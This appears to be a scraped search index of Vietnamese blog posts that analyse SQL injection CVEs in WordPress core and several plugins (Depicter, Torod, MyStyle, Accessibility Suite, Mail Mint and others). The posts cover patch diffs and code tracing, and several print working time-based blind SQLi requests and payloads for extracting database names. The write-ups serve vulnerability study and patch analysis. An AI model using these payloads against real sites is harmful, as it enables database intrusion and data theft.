Required PHP Version WordPress được xây dựng hoàn toàn bằng PHP, vì vậy phiên bản PHP trên máy chủ có ảnh hưởng trực tiếp đến khả năng hoạt động của WordPress: Mỗi phiên bản PHP đều bổ sung tính năng mới và loại bỏ dần các hàm/cú pháp lỗi thời. Nếu WordPress dùng tính năng mới nhưng PHP trên server quá cũ =\u003e sẽ phát sinh lỗi cú pháp (syntax error) hoặc không chạy được. Ngược lại, nếu PHP quá mới, một số hàm cũ mà WordPress vẫn còn sử dụng có thể đã deprecated hoặc bị loại bỏ hoàn toàn, gây lỗi khi chạy. 👉 Do đó, cần lựa chọn phiên bản PHP tương thích với phiên bản WordPress. Trong phân tích này, ta sử dụng PHP 7.4 để cài đặt WordPress 5.8.2. VSCode Extensions WordPress có mã nguồn phức tạp, nên việc đọc từng dòng code thủ công là không khả thi. Để hỗ trợ quá trình debug và truy vết, ta cần cài đặt thêm hai extension sau trong VS Code: PHP Extension Pack =\u003e tìm bằng từ khóa: xdebug.php-pack PHP Tools for VS Code =\u003e tìm bằng từ khóa: devsense.phptools-vscode Custom Plugin Vì lỗ hổng SQLi này ảnh hưởng đến WordPress Core, nhưng chỉ có thể khai thác gián tiếp thông qua plugin hoặc theme sử dụng WP_Query, nên ta cần thông qua một plugin hoặc theme để tạo tương tác với WP_Query. Ta xây dựng plugin sử dụng WP_Query, hiển thị query được thực thi thông qua WP_Query::request. \u003c?php /** * Plugin Name: Demo WP_Query * Description: Plugin demo WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined('ABSPATH')) exit; function da_show_posts() { $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e [1,2,3], 'operator' =\u003e 'IN', ], ], ]; $query = new WP_Query($args); ob_start(); echo '\u003ch3\u003eDemo WP_Query\u003c/h3\u003e'; echo '\u003cpre style=\"background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\"\u003e'; echo \"SQL query generated by WP_Query:\\n\\n\"; echo esc_html($query-\u003erequest); // Display executed query echo '\u003c/pre\u003e'; if ($query-\u003ehave_posts()) { echo '\u003cul\u003e'; while ($query-\u003ehave_posts()) { $query-\u003ethe_post(); echo '\u003cli\u003e' . get_the_title() . ' (' . get_the_ID() . ')\u003c/li\u003e'; } echo '\u003c/ul\u003e'; } else { echo '\u003cp\u003eNo posts found.\u003c/p\u003e'; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode('demo_wp_query', 'da_show_posts'); Taxonomy parameters Tạo page mới với \u003cpage-title\u003e có shortcode : [demo_wp_query] 👉 Truy vấn sẽ được hiển thị khi truy cập http://localhost/\u003cpage-title\u003e Trang demo hiển thị kết quả WP_Query Analysis wpdb Là lớp PHP cốt lõi của WordPress dùng để thao tác trực tiếp với MySQL. Cho phép lập trình viên viết và thực thi câu SQL thô. WP_Query Là một lớp trừu tượng hóa giúp lấy dữ liệu bài viết (post) từ database mà không cần viết SQL trực tiếp. Lập trình viên chỉ cần truyền vào mảng tham số (args), WordPress sẽ tự động dựng câu SQL phù hợp. Mối quan hệ WP_Query không trực tiếp truy vấn MySQL. Thay vào đó, nó xây dựng câu SQL dựa trên args, áp dụng các bước kiểm tra/validate, rồi gọi $wpdb để thực thi. Patch Diff WordPress là một dự án mã nguồn mở với kho lưu trữ được công khai trên GitHub. Vì vậy, mọi bản vá đều được commit trực tiếp tại đây. Do đó, để phân tích một lỗ hổng, ta chỉ cần tìm đến commit liên quan và quan sát sự thay đổi trong mã nguồn. Trong phần reference của CVE-2022-21661, có liên kết đến commit trên GitHub: So sánh bản vá giữa hai phiên bản Lỗ hổng được vá trong file src/wp-includes/class-wp-tax-query.php Bản lỗi $q","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Depicter Slider Plugin.","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng xảy ra trên plugin Depicter Slider của WordPress trước phiên bản 3.6.2. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Depicter Slider: v3.6.1(vul) và v3.6.2(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ GET request vào SQL query mà không có cơ chế kiểm soát chặt chẽ. Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file app/src/Controllers/Ajax/LeadsAjaxController.php index, list, export là 3 hàm đáng chú ý nằm trong class LeadsAjaxController public function index(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::lead()-\u003eget($args); $statusCode = isset($response['errors']) ? 400 : 200; return \\Depicter::json($response)-\u003ewithStatus($statusCode); } public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } public function export(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); // other logic return \\Depicter::json([ 'errors' =\u003e [__('error occurred during the export process', 'depicter')] ])-\u003ewithStatus(400); } Cả 3 hàm đều được vá bằng cách sử dụng Sanitize::sql thay cho Sanitize::textfield nhằm đảm bảo param 's' được làm sạch và escape phù hợp cho ngữ cảnh câu lệnh SQL. Ảnh minh họa sự khác biệt bản vá và bản lỗi How it work? Để hiểu rõ hơn chức năng của textfield và sql ta tìm kiếm với từ khóa function textfield, có lẽ chúng được đặt trong cùng 1 file vì được gọi bằng cùng 1 class Sanitize Nếu bạn đã cài PHP Intelephense Extension trong vscode, bạn có thể di chuyển đến hàm cụ thể bằng cách Ctrl + Click vào hàm cần đến. Tìm kiếm hàm textfield trong class Sanitize textfield trả về dữ liệu đã được sanitize bằng sanitize_text_field, sql cũng là hàm trong cùng class, trả về dữ liệu đã được escape SQL public static function sql( $input ) { return esc_sql( $input ); } Vì đây là lỗ hổng unauthenticated, việc có 3 hàm như này, ta cần xác định xem điểm gọi đến chúng có cơ chế xác thực hay không. Chỉ sau khi chắc chắn rằng hàm nào thực sự được gọi trong bối cảnh không yêu cầu xác thực, ta mới tiếp tục phân tích phần logic bên trong để kiểm tra khả năng gây ra SQL Injection giúp giới hạn phạm vi truy vết. Để xác định 3 hàm trên được gọi ở đâu, ta có thể tìm kiếm trực tiếp theo tên hàm. Tuy nhiên, các từ khóa như index, list, hay export lại quá phổ biến nên kết quả tìm kiếm sẽ rất nhiều và khó lọc. Vì vậy, thay vì tìm theo tên hàm, ta tìm với từ khóa là tên class LeadsAjaxController. Bởi lẽ khi được sử dụng, các hàm này đều phải được gọi thông qua class, nhờ đó phạm vi kết quả tìm kiếm sẽ được thu hẹp và dễ dàng hơn. Kết quả tìm kiếm LeadsAjaxController trong mã nguồn 👉 LeadsAjaxController được sử dụng trong quá trình đăng ký route Ajax. Khi có request gửi tới endpoint /wp-admin/admin-ajax.php?action=action_here\u0026param1=param1_here\u0026paramN=paramN_here, hệ thống sẽ dựa trên khai báo handle('LeadsAjaxController@function') để gọi tới phương thức tương ứng trong class LeadsAjaxController Cả ba hàm ta đang focus đều được gọi bằng phương thức GET, nhưng export lại có middleware xử lý csrf-api, nên ta bỏ qua. Chỉ truy vết index và list Khi phân tích hai hàm này, ta thấy trong hàm index, biến $response được gán giá trị từ \\Depicter::lead()-\u003eg","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng xảy ra trên plugin Woocommerce Partial Shipment của WordPress trước phiên bản 3.3. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Woocommerce Partial Shipment: v3.2(vul) và v3.3(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Actived WooCommerce plugin: plugin bắt buộc actived trước khi cài Woocommerce Partial Shipment Plugin, một số hàm trong WooCommerce sẽ được sử dụng. Analysis Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ POST request vào SQL query mà không có cơ chế kiểm soát chặt chẽ. Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file wc-partial-shipment/woocommerce-partial-shipment.php Nhưng ở đây, dev thay đổi khá nhiều ta khó để tìm được vị trí lỗi. Trong WordPress, để SQLi xảy ra, ứng dụng phải tương tác với database thông qua biến global $wpdb, ta search từ khóa này trong file wc-partial-shipment/woocommerce-partial-shipment.php để tìm sink. Kết quả tìm vị trí sink trong mã nguồn get_shipment_id và get_wxp_shipment_data là 2 hàm thuộc class WXP_Partial_Shipment đáng chú ý, dữ liệu được đưa thẳng vào câu query mà không có cơ chế kiểm soát nào. Do đó, lỗ hổng SQLi có thể xảy ra. So sánh sự khác biệt giữa bản lỗi và bản vá Bản vá sử dụng $wpdb-\u003eprepare() để chuẩn bị câu query, thay vì nối trực tiếp dữ liệu từ người dùng. Điều này đảm bảo rằng tất cả giá trị được escape đúng cách trước khi chèn vào SQL, ngăn ngừa nguy cơ SQL Injection. How it work? get_shipment_id và get_wxp_shipment_data đều được hàm wxp_order_set_shipped trong cùng class gọi và sử dụng. function wxp_order_set_shipped(){ $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0; // other logic $wxp_shipment = $this-\u003eget_wxp_shipment_data($order_id); if(isset($_POST['order_id']) \u0026\u0026 $_POST['order_id']){ global $wpdb; $shipment_id = $this-\u003eget_shipment_id($_POST['order_id']); if(!$shipment_id){ $data = array( 'order_id' =\u003e$order_id, 'shipment_id' =\u003e1, 'shipment_url'=\u003e'', 'shipment_num'=\u003e'', 'shipment_date'=\u003ecurrent_time('timestamp',0), ); $wpdb-\u003einsert($wpdb-\u003eprefix.\"partial_shipment\",$data,array('%d','%d','%s','%s','%s')); $shipment_id = $wpdb-\u003einsert_id; } // other logic } echo json_encode(array('order_id'=\u003e$order_id,'status'=\u003e$status_key)); exit(); } 👉 order_id được lấy từ POST request, nơi người dùng có thể kiểm soát làm đối số khi gọi hàm get_shipment_id và get_wxp_shipment_data truyền vào câu query chứa lổ hỗng SQLi. Để xác định nơi wxp_order_set_shipped được gọi và sử dụng, ta tìm kiếm với từ khóa wxp_order_set_shipped trong thư mục chứa plugin. Tìm vị trí nơi hàm wxp_order_set_shipped được gọi wxp_order_set_shipped được construct của cùng class sử dụng làm callback cho hook wp_ajax_wxp_order_set_shipped =\u003e yêu cầu người dùng phải đăng nhập 👉 Khi truy cập vào /wp-admin/admin-ajax.php với tham số: action=wxp_order_set_shipped\u0026order_id=payload_here Callback wxp_order_set_shipped được gọi order_id được lấy trực tiếp từ request và chèn vào SQL query. Query thực thi 2 lần do được truyền vào 2 hàm chạy lệnh SQL với payload độc hại. Exploit Detect SQLi Gửi POST request chứa payload SQLi. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi đó câu query sẽ trở thành: SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Ở đây có 2 nơi thực hiện query nên thời gian phản hồi sẽ tăng gấp đôi Kết quả phản hồi khi khai thác thành công Ta sử dụng subquery trong mệnh đề FROM vì truy vấn con được coi như một bảng tạm thời. MySQL sẽ thực thi truy ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Torod Plugin.","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng xảy ra trên plugin Torod của WordPress. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.9 Fixed in: \u003c= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Torod: v1.9 Analysis Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ POST request vào SQL query mà không có cơ chế quản kiểm soát chặt chẽ. Vulnerable Sink CVE này không có bản vá nên không thể sử dụng diff tool để so sánh sự khác biệt giữa code lỗi và code đã fix lỗi. Trong WordPress, để SQLi xảy ra, ứng dụng phải tương tác với database thông qua biến global $wpdb, ta search từ khóa này trong thư mục của plugin để tìm sink. Tìm vị trí sink trong code 👉 Dữ liệu từ $_POST['country_id'] được đưa thẳng vào truy vấn SQL mà không có cơ chế kiểm soát hợp lệ. Việc chỉ sử dụng sanitize_text_field() mới dừng lại ở mức escape chuỗi, chứ không đảm bảo tính an toàn. Do đó, lỗ hổng SQLi có thể xảy ra. Source: $_POST['country_id'] Sink: $wpdb-\u003eget_results(\"SELECT * FROM $table_name WHERE country_id = $country_id\") How it work? Lỗ hổng nằm trong hàm get_regions_and_cities của class ajaxyk thuộc file inc/ajaxyk.php. Để xác định nơi nó được gọi, ta tìm kiếm với từ khóa get_regions_and_cities trong thư mục chứa plugin. Tìm vị trí hàm get_regions_and_cities 👉 get_regions_and_cities được construct của class ajaxyk gọi làm callback của 2 action hook thông qua hàm add_action wp_ajax_get_regions_and_cities Được viết theo cú pháp wp_ajax_{$action} Yêu cầu người dùng đăng nhập wp_ajax_nopriv_get_regions_and_cities Được viết theo cú pháp wp_ajax_nopriv_{$action} Không yêu cầu người dùng đăng nhập Vì đây là lỗ hổng unauthenticated nên ta chỉ quan tâm tới hook wp_ajax_nopriv_get_regions_and_cities. Như vậy khi gửi POST request đến /wp-admin/admin-ajax.php với tham số action=wp_ajax_nopriv_get_regions_and_cities\u0026country_id=payload_here Callback get_regions_and_cities được gọi. country_id được lấy trực tiếp từ request và chèn vào SQL query. Query thực thi với payload độc hại. Exploit Detect SQLi Gửi POST request chứa payload SQLi. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi đó câu query sẽ trở thành: SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) Kết quả phản hồi thời gian 👉 Dựa trên thời gian phản hồi =\u003e payload hoạt động. Các technique có thể sử dụng trong trường hợp table rỗng: UNION: vì nó không phụ thuộc vào dữ liệu bảng của câu query trước đó, nhưng cần phải tìm được số cột tương ứng. Subquery: Subquery trong mệnh đề WHERE: MySQL có thể tối ưu hóa và bỏ qua subquery nếu kết quả có thể xác định sớm. Nếu bảng không có dữ liệu, kết quả cuối cùng sẽ là tập rỗng, MySQL không cần thực thi SLEEP(). Subquery trong mệnh đề FROM: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính. Thứ tự thực thi truy vấn SQL Get First Letter of Database Name Điều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được. Gửi request với SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) Sử dụng SUBSTRING() để lấy ký tự đầu tiên của database name, IF() trả về SLEEP(5) nếu ký tự đó là 0x77(‘w’) Sử dụng hex encoding w thành 0x77 vì country_id được lấy từ POST request trong nên bị escape bởi magic quotes trong WordPress và bởi sanitize_text_field. 👉 Dựa trên thời gian phản hồi =\u003e kí tự đầu tiên đúng là w. Conclusion Lỗ hổng CVE-2025-30936 trong plugin Wor","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress MyStyle Custom Product Designer Plugin.","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng tồn tại trong plugin MyStyle Custom Product Designer của WordPress trước phiên bản 3.21.2. Lỗ hổng này cho phép kẻ tấn công tương tác trực tiếp với cơ sở dữ liệu, bao gồm khả năng trích xuất hoặc thao túng dữ liệu. CVE ID: CVE-2025-48281 Sản phẩm: WordPress MyStyle Custom Product Designer Plugin Loại lỗ hổng: SQL Injection Phiên bản bị ảnh hưởng: \u003c= 3.21.1 Mức độ nghiêm trọng (CVSS): Cao (9.3) Yêu cầu đặc quyền: Không cần xác thực Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. MyStyle Custom Product Designer: v3.21.1 (có lỗ hổng) và v3.21.2 (đã vá) Công cụ diff: meld hoặc bất kỳ công cụ so sánh phiên bản nào WooCommerce plugin: phải được kích hoạt trước khi cài đặt MyStyle vì plugin này sử dụng một số hàm từ WooCommerce Analysis Nguyên nhân chính là việc ứng dụng chèn trực tiếp dữ liệu từ tham số GET vào câu truy vấn SQL mà không có biện pháp xác thực hợp lệ. Patch Diff Dưới đây là sự khác biệt giữa hai phiên bản (3.21.1 và 3.21.2) trong file includes/entities/class-mystyle-designmanager.php. So sánh bản vá Bản vá mới đã thêm danh sách whitelist $allowed_orderby để chỉ cho phép sắp xếp theo các cột hợp lệ. Nếu giá trị orderby không nằm trong danh sách, nó sẽ tự động bị thay thế bằng 'ms_design_id', ngăn chặn chèn mã độc SQL. How it works Lỗ hổng nằm trong hàm get_designs thuộc class MyStyle_DesignManager (file includes/entities/class-mystyle-designmanager.php). Hàm này được gọi bởi các hàm như get_items, init_index_request, và một số hàm kiểm thử. Kết quả tìm kiếm get_designs Vì đây là lỗ hổng unauthenticated, cần xác định hàm nào có thể được gọi mà không yêu cầu đăng nhập. Kết quả cho thấy chỉ có init_index_request có thể bị khai thác trực tiếp qua URL /designs/. Luồng tấn công logic Exploit Kiểm tra SQLi Gửi request chứa payload SQLi để kiểm tra: GET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here Câu truy vấn kết quả: SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 Nếu phản hồi chậm 5 giây → payload hoạt động. Kiểm tra độ trễ thời gian Không thêm dấu comment (--) sau SLEEP() vì sẽ khiến SQL parser lỗi do xuống dòng giữa ASC và OFFSET. Debug lỗi Lấy ký tự đầu tiên của tên cơ sở dữ liệu GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here Nếu phản hồi chậm → ký tự đầu tiên của tên database là w. Kỹ thuật này có thể được mở rộng để trích xuất toàn bộ tên cơ sở dữ liệu hoặc bảng dữ liệu. Conclusion Lỗ hổng CVE-2025-48281 trong plugin MyStyle Custom Product Designer (\u003c= 3.21.1) xuất phát từ việc đưa trực tiếp dữ liệu người dùng vào truy vấn SQL mà không xác thực đúng cách. Bản vá 3.21.2 đã khắc phục bằng cách áp dụng danh sách cột cho phép (whitelist) và kiểm tra giá trị đầu vào. Bài học rút ra: Luôn xác thực dữ liệu đầu vào. Khi làm việc với cơ sở dữ liệu trong WordPress, bắt buộc dùng $wpdb-\u003eprepare(). Thường xuyên cập nhật plugin để tránh trở thành mục tiêu tấn công. References SQL Injection Cheat Sheet - PortSwigger WordPress MyStyle Custom Product Designer Plugin \u003c= 3.21.1 SQL Injection ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Accessibility Suite Plugin.","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng xảy ra trên plugin Accessibility Suite của WordPress trước phiên bản 4.19. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Accessibility Suite: v4.18(vul) và v4.19(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng chưa thực hiện ép kiểu cho input và mặc dù có sử dụng prepare() để chống SQLi, nhưng do triển khai không đúng nên lỗ hổng SQLi vẫn tồn tại. Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/classes/Helper.php static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $list = json_decode( $wpdb-\u003eget_results($wpdb-\u003eprepare(\"SELECT list FROM $table_name WHERE scan_id = $scan_id\"))[0]-\u003elist // phpcs:ignore ); } Bản vá đã truyền $scan_id như tham số vào câu query. SQL injection được phòng ngừa vì biến không được nối trực tiếp vào query nữa. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\"status\" =\u003e \"failed\", \"msg\" =\u003e \"Invalid scan ID\"]; } // Get list using properly prepared query $query = $wpdb-\u003eprepare( \"SELECT list FROM %i WHERE scan_id = %d\", $table_name, $scan_id ); $result = $wpdb-\u003eget_results($query); } Patch diff How it work? Lỗ hổng nằm trong hàm tĩnh save_false_positive của class Helper thuộc file includes/classes/Helper.php. Để xác định nơi nó được gọi, ta tìm kiếm với tự khóa save_false_positive trong thư mục chứa plugin. Search save_false_positive 👉 save_false_positive được callback của action hook wp_ajax_ONLINE_ADAv4/save_false_positive gọi. Khi POST request được gửi đến /wp-admin/admin-ajax.php với action=ONLINE_ADAv4/save_false_positive callback được gọi. Trong request cần 2 POST param issue_id và scan_id. Nếu không, ứng dụng sẽ trả về: save_false_positive được gọi với đối số issue_id và scan_id. Các đối số này sẽ bị escape bởi magic quotes trong WordPress vì lấy trực tiếp từ POST request. Ứng dụng check xem người dùng có quyền truy cập vào trang admin không. Nếu không, trả về chuỗi rỗng. if(! is_admin()) { return ''; } Sau đó các đối số trực tiếp truyền vào câu query chứa lỗ hổng SQLi rồi thực thi. Exploit Detect SQLi Gửi POST request chứa payload SQLi. Vì chỉ cần là user có quyền truy cập vào trang admin, nên ta tạo user với role:subcriber có privilege thấp nhất. Trong WordPress, user có role cao hơn sẽ kế thừa cả privilege role thấp hơn. Nên chỉ cần user subcriber gửi payload thành công thì tất cả user còn lại đều có thể. Đúng với mô tả của CVE POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT SLEEP(5) Khi đó câu query sẽ trở thành SELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) Time response with SQLi payload 👉 Dựa trên thời gian phản hồi =\u003e payload hoạt động. Các technique có thể sử dụng trong trường hợp table rỗng: UNION: vì nó không phụ thuộc vào dữ liệu bảng của câu query trước đó, nhưng cần phải tìm được số cột tương ứng với truy vấn trước đó. Subquery: Subquery trong mệnh đề WHERE: MySQL có thể tối ưu hóa và bỏ qua subquery nếu kết quả có thể xác định sớm. Nếu bảng không có dữ liệu, kết quả cuối cùng sẽ là tập rỗng, MySQL không cần thực thi SLEEP(). Subquery trong mệnh đề FROM: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực t","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Mail Mint Plugin.","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng xảy ra trên plugin Mail Mint của WordPress trước phiên bản 1.18.6. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Mail Mint: v1.18.5(vul) và v1.18.6(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà không sử dụng các biện pháp bảo vệ khiến lỗ hổng SQL Injection xảy ra. Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file /app/Utilities/Helper/Import.php public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"')\"; $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \"SELECT user_id FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"') GROUP BY user_id LIMIT $number OFFSET $offset\"; $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } Bản vá sử dụng $wpdb-\u003eprepare() thay vì truyền trực tiếp dữ liệu từ người dùng vào câu query. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u003eprepare( \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders)\", $keys ); $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026 OFFSET (safe with prepare) $final_query = $wpdb-\u003eprepare( \"SELECT user_id FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\", array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } Patch Diff How it work? Lỗ hổng nằm trong hàm get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) của class Import. Để xác định nơi nó được gọi, ta tìm kiếm với tự khóa get_wp_users_by_learndash_with_limit_offset trong thư mục chứa plugin. Search Import Kết 